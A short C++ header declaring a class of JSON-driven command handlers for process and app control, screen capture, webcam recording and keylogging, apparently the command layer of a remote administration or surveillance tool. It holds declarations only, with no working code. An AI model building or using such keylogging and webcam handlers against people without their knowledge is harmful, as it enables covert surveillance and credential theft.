#pragma once

#include "ProcessManager.h"
#include "Capture.h"
#include "WebcamRecord.h"
#include "Keylogging.h"

#include <nlohmann/json.hpp>
using json = nlohmann::json;

class ProcessHandlers
{
public:
    static json listProcesses(const json &);
    static json startProcess(const json &);
    static json stopProcessPid(const json &);

    static json listApps(const json &);
    static json startApp(const json &);
    static json stopApp(const json &);

    static json captureScreen(const json &);
    static json recordWebcam(const json &);

    static json startKeylog(const json &);
    static json stopKeylog(const json &);

    static json help(const json &);
};
